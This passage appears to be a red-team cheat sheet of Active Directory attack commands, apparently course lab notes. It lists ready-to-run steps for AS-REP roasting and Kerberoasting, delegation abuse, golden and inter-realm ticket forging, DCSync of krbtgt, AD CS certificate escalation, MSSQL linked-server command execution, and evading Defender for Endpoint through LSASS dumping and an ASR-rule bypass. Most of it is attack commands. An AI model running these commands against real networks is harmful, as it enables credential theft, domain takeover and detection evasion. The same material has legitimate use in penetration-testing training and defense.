  - `impacket-GetNPUsers -dc-ip <IP-Domain-Controller> -request -outputfile <output_file.asreproast> <domain>/<user>`
- On Windows
  - Enumerate accounts with Kerberos Preauth disabled
    - With PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
    - With ActiveDirectory module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
  - Force disable Kerberos Preauth
    1. Enumerate the permissions for RDPUsers on ACLs with PowerView: `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
    2. `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`
    3. `Get-DomainUser -PreauthNotRequired -Verbose`
  - Request encrypted AS-REP for offline brute-force
    - With [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
      - `Get-ASREPHash -Domain <domain_name> -Username <username>`
      - Enumerate all users with Kerberos preauth disabled and request a hash: `Invoke-ASREPRoast -Verbose`
- Crack the AS-REP hash
  - `sudo hashcat -m 18200 <output_file.asreproast> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
  - `john --wordlist=/usr/share/wordlists/rockyou.txt <output_file.asreproast>`
- Other notes    
  - `UF_DONT_REQUIRE_PREAUTH`
    - [Get AS-REP Hash | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#get-as-rep-hash)
  - With [Rubeus](https://github.com/GhostPack/Rubeus), `.\Rubeus.exe asreproast /nowrap` perform AS-REP roasting
 
Set SPN
- Enumerate the permissions for RDPUsers on ACLs using PowerView
  - `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
- With Powerview, see if the user already has a SPN
  - `Get-DomainUser -Identity supportuser | select serviceprincipalname`
  - With ActiveDirectory module: `Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`
- Set a SPN for the user (must be unique for the domain)
  - `Set-DomainObject -Identity support1user -Set @{serviceprincipalname='<domain>/<user>'}`
  - With ActiveDirectory module: `Set-ADUser -Identity <user-rdp> -ServicePrincipalNames @{Add='<domain>/<user>'}`
- `Rubeus.exe kerberoast /outfile:<targetedhashes>.txt`
- `john.exe --wordlist=C:\path\to\10k-worst-pass.txt C:\path\to\<targetedhashes>.txt`

### Unconstrained Delegation

Discover domain computers with unconstrained delegation enabled using PowerView
- `Get-DomainComputer -UnConstrained`
- With ActiveDirectory: `Get-ADComputer -Filter {TrustedForDelegation -eq $True}`

Compromise the server(s) where Unconstrained Delegation is enabled
- Wait for a Domain Admin to connect a service on appsrv (or trick it)
- Now, if the command is run again
  - `Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`
- The DA token could be reused
  - `Invoke-Mimikatz -Command '"kerberos::ptt C:\Path\To\Your\Kirbi\File.kirbi"'`
 
Printer Bug
- We can capture the TGT of <domain-controller>$ by using Rubeus on domain-appsrv:
  - `Rubeus.exe monitor /interval:5 /nowrap`
- And after that run [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample) on the student VM:
  - `MS-RPRN.exe \\<DC_hostname> \\<App_server_hostname>`
- For Linux: [Coercer](https://github.com/p0dalirius/Coercer)
- Copy the base64 encoded TGT, remove extra spaces and use it on the windows machine: `Rubeus.exe ptt /tikcet:`
- Once the ticket is injected, run DCSync:
  - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'`

### Constrained delegation

Enumerate users and computers with constrained delegation enabled
- Using PowerView
  - `Get-DomainUser -TrustedToAuth`
  - `Get-DomainComputer -TrustedToAuth`
- Using ActiveDirectory module:
  - `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
 
Using Kekeo
- Plaintext password or NTLM hash/AES keys required
- Request a TGT using asktgt
  - `kekeo# tgt::ask /user:<username> /domain:<domain_name> /rc4:<NTLM_hash>`
- Request a TGS using s4u
  - `tgs::s4u /tgt:<TGT> /user:<username>@<domain> /service:<service>`
- Using mimikatz, inject the ticket
  - `Invoke-Mimikatz -Command '"kerberos::ptt <TGS_ticket_path>"'`
  - `ls \\<target_hostname>\c$`
 
Using Rubeus
- Request a TGT and TGS in a single command
  - `Rubeus.exe s4u /user:<websvc_user> /aes256:<aes256_hash> /impersonateuser:<target_user> /msdsspn:<SPN> /ptt`
  - `ls \\<target_hostname>\c$`
 
-> Another issue with Kerberos is that delegation takes place not only for the designated service but also for any service operating under the same account. Moreover, there's no validation performed for the specified SPN.

Abusing with Kekeo
- Plaintext password or NTLM hash required
- Request a TGT using asktgt
  - `tgt::ask /user:<target_user>$ /domain:<domain_name> /rc4:<rc4_hash>`
- Using s4u (no SNAME validation):
  - `tgs::s4u /tgt:<TGT_path> /user:<target_user>@<domain> /service:<service_SPN>`
- Using mimikatz
  - `Invoke-Mimikatz -Command '"kerberos::ptt <TGS_Ticket.kirbi>"'`
  - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<krbtgt_user>"'`

Abusing with Rubeus
- Request a TGT and TGS in a single command
  - `Rubeus.exe s4u /user:<target_user> /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:<target_SPN> /altservice:ldap /ptt`

After injection, we can DCSync:
`C:\path\to\SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"`

### Resource-based Constrained Delegation

SeEnableDelegation privileges are required which are, by default, available only to Domain Admins

To abuse RBCD, you need two privileges
1. Permissions are required over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity
2. Possessing control over an object configured with SPN (Service Principal Name), such as having administrative access to a domain-joined machine or the capability to join a machine to the domain (where ms-DS-MachineAccountQuota is set to 10 for all domain users)

Process
- Enumeration shows that `<admin>` has Write permissions over `<target_computer>`
  - `Find-InterestingDomainACL | ?{$_.identityreferencename -match '<admin>'}`
- With ActiveDirectory, configure RBCD on `<target_computer>` for `<user>` machines
  - `$comps = '<hostname1>','<hostname2>'`
  - `Set-ADComputer -Identity <target_computer> -PrincipalsAllowedToDelegateToAccount $comps`
- Now, let's get the privileges of `<hostnamex>$` by extracting its AES keys
  - `Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
- Use the AES key of `<hostnamex>$` with Rubeus and access `<target_computer>` as any user desired
  - `Rubeus.exe s4u /user:<hostnamex>$ /aes256:<AES256_Key> /msdsspn:http/<target_SPN> /impersonateuser:<impersonated_user> /ptt`
  - `winrs -r:<target_computer> cmd.exe`

### Child to Parent using Trust Tickets

- Look for [In] trust key from child to parent
  - `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <computer_name>`
  - or: `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<user>$"'`
  - or: `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
- Forge and inter-realm TGT:
  - `C:\path\to\BetterSafetyKatz.exe "kerberos::golden /user:<target_user> /domain:<target_domain> /sid:<target_domain_SID> /sids:<domain_SID> /rc4:<NTLM_hash> /service:krbtgt /target:<target_domain> /ticket:<path_to_ticket.kirbi>" "exit"`

Abuse with Kekeo
- Get a TGS for a service in the target domain by using the forged trust ticket
  - `.\asktgs.exe C:\path\to\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local`
- Use the TGS to access the targeted service
  - `.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi`
  - `ls \\mcorp-dc.moneycorp.local\c$`
- You can also create tickets for others serivces (HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM)

Abuse with Rubeus. Note that we are still using the TGT forged initially
- `Rubeus.exe asktgs /ticket:<path_to_TGS_ticket.kirbi> /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt`
- `ls \\mcorp-dc.moneycorp.local\c$`

### Child to Parent using krbtgt hash

- Exploit sIDhistory with Mimikatz. The option `/sids` is forcefully setting the sIDHistory for the Enterprise Admin group for `<domain>` that is the Forest Enterprise Admin Group.
  - `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' C:\path\to\BetterSafetyKatz.exe "kerberos::golden /user:<target_user> /domain:<domain_name> /sid:<SID> /sids:<additional_SID> /krbtgt:<krbtgt_hash> /ptt" "exit"`
- On any machine of the current domain
  - `Invoke-Mimikatz -Command '"kerberos::ptt <TGS_Ticket.kirbi>"'`
  - `ls \\<DC_hostname>\<share>\c$`
  - `gwmi -class win32_operatingsystem -ComputerName <DC_hostname>`
  - `C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt /domain:<domain_name>" "exit"`
- Avoid suspicious logs by using Domain Controllers group
  - `C:\path\to\BetterSafetyKatz.exe "kerberos::golden /user:<user> /domain:<domain_name> /sid:<domain_SID> /groups:516 /sids:S-1-5-21-<RID>-<RID>-<RID>-516,S-1-5-9 /krbtgt:<krbtgt_hash> /ptt" "exit"`
 - `C:\path\to\SafetyKatz.exe "lsadump::dcsync /user:<domain>\<krbtgt_user> /domain:<domain_name>" "exit"`
- `S-1-5-21-2578538781-2508153159-3419410681-516` - Domain Controllers
- `S-1-5-9` - Enterprise Domain Controllers

### Across Forest using Trust Tickets

1. Request the trust key for the inter forest trust
   - `Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
   - or `nvoke-Mimikatz -Command '"lsadump::lsa /patch"'`
2. Forge an inter-forest TGT
   - `C:\path\to\BetterSafetyKatz.exe "kerberos::golden /user:<target_user> /domain:<target_domain> /sid:<target_sid> /rc4:<ntlm_hash> /service:krbtgt /target:<target_domain> /ticket:<path_to_ticket>" "exit"`
Abuse with Kekeo
- Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket
  - `.\asktgs.exe C:\path\to\trust_forest_tkt.kirbi CIFS/eurocorp-dc.corporate.local`
- Use the TGS to access the targeted service.
  - `.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi`
  - `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`
Abuse with Rubeus
- `Rubeus.exe asktgs /ticket:C:\path\to\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt`
- `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`

### Across domain trusts - Active Directory Certificate Services (AD CS)

- Use [Certify](https://github.com/GhostPack/Certify) to enumerate AD CS in the target forest
  - `Certify.exe cas`
  - Enumerate the templates: `Certify.exe find`
  - Enumerate vulnerable templates: `Certify.exe find /vulnerable`

Escalation to DA
- Request a certificate for Certificate Request Agent from TemplateTarget-Agent template.
  - `Certify.exe request /ca:<CA_Server>\<CA_Name> /template:TemplateTarget-Agent`
- Convert the cert.pem file to pfx format, named esc3agent.pfx, and utilize it to request a certificate on behalf of the Domain Administrator (DA) using the "TemplateTarget-Users" template.
  - `Certify.exe request /ca:<CA_Server>\<CA_Name> /template:TemplateTarget-Users /onbehalfof:<domain>\administrator /enrollcert:esc3agent.pfx /enrollcertpw:<Password>`
- Convert the cert.pem file into a pfx format, named esc3user-DA.pfx. Then, proceed to request the Ticket Granting Ticket (TGT) for the Domain Administrator (DA) and inject it
  - `Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:<Password> /ptt`
- Convert the cert.pem file to pfx format, naming it esc3agent.pfx. Then, use it to request a certificate on behalf of the Enterprise Admin (EA) utilizing the "TemplateTarget-Users" template.
  - `Certify.exe request /ca:<CA_Server>\<CA_Name> /template:TemplateTarget-Users /onbehalfof:<domain>\<username> /enrollcert:esc3agent.pfx /enrollcertpw:<Password>`
- Request EA TGT and inject it:
  - `Rubeus.exe asktgt /user:<domain>\<username> /certificate:esc3user.pfx /dc:<DC_Server> /password:<Password> /ptt`
- If the CA in the domain has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set  means that we can request a certificate for ANY user from a template that allow enrollment for normal/low-privileged users.
  - `Certify.exe find`
- The template "CA-Integration" grants enrollment to the RDPUsers group. Request a certificate for DA (or EA) as userx
  - `Certify.exe request /ca:<CA_Server>\<CA_Name> /template:"CA-Integration" /altname:<username>`
- Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (or EA).
  - `Rubeus.exe asktgt /user:<domain>\<username> /certificate:esc6.pfx /password:<Password> /ptt`

## Trust Abuse

### MSSQL Servers

- See: [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

Notes
- if you are targeting databases, go for information first. Do not rush for xp_cmdshell.
- Never run a `select *` on a production database
- Think about the value that you can add and the maxium damage that you can do from non-auth/low priv users. Do not just rush and kill everything
- The crawling of Database Links is not noisy

Commands
- Discovery (SPN Scanning)
  - `Get-SQLInstanceDomain`
- Check Accessibility
  - `Get-SQLConnectionTestThreaded`
  - `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded - Verbose`
- Gather Information
  - `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
 
A database link enables a SQL Server to interact with external data sources such as other SQL Servers and OLE DB data sources. In scenarios involving linked SQL servers, it's feasible to execute stored procedures. Notably, database links operate seamlessly even across forest trusts.

Searching Database Links
- Look for links to remote servers
  - `Get-SQLServerLink -Instance dcorp-mssql -Verbose`
  - or `select * from master..sysservers`
- Enumerating Database Links - Manually
  - `openquery()` function can be used to run queries on a linked database
  - `select * from openquery("dcorp-sql1",'select * from master..sysservers')`
 
Database Links Enumeration
- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
- Openquery queries can be chained to access links within links (nested links)
  - `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')`
 
Executing Commands
- On the target server, either `xp_cmdshell` should already be enabled, or if `rpcout` is enabled (which is disabled by default), `xp_cmdshell` can be enabled using:
  - `EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"`
- Use the `-QuertyTarget` parameter to run Query on a specific instance
  - `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql`
- OS commands can be executed using nested link queries from the initial SQL server
  - `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')`

## MDE - EDR

[MiniDumpDotNet](https://github.com/WhiteOakSecurity/MiniDumpDotNet) (Note: do not run it blindly)
- Git clone the project and build it. Check for any detections by Windows using DefenderCheck: `.\DefenderCheck.exe C:\[ath\to\minidumpdotnet.exe`
- Dump the LSASS process with minidumpdotnet: `.\minidumpdotnet.exe <LSASS PID> <minidump file>`

To find LSASS PID
- `tasklist /v` to enumerate the LSASS PID (Note: is detected by MDE)
- Make use of standard WINAPIs to find the LSASS PID (Note: opsec safe)
- In case of RDP access, tools like Task Manager (or other less suspicious alternatives) could also be used for finding LSASS PID

To avoid detections based on a specific ASR rule such as the "Block process creations originating from PSExec and WMI commands" rule:
- winrm access (winrs) instead of PSExec/WMI execution (Note: this is undetected by MDE but detected by MDI)
- Use `GetCommandLineExclusions` which displays a list of command line exclusions (ex: `.:\\windows\\ccm\\systemtemp\\.+`), if included in the command line will result in bypassing this rule and detection. `C:\path\to\WSManWinRM.exe eu-sql.eu.eurocorp.local "cmd /c notepad.exe C:\Windows\ccm\systemtemp\"`
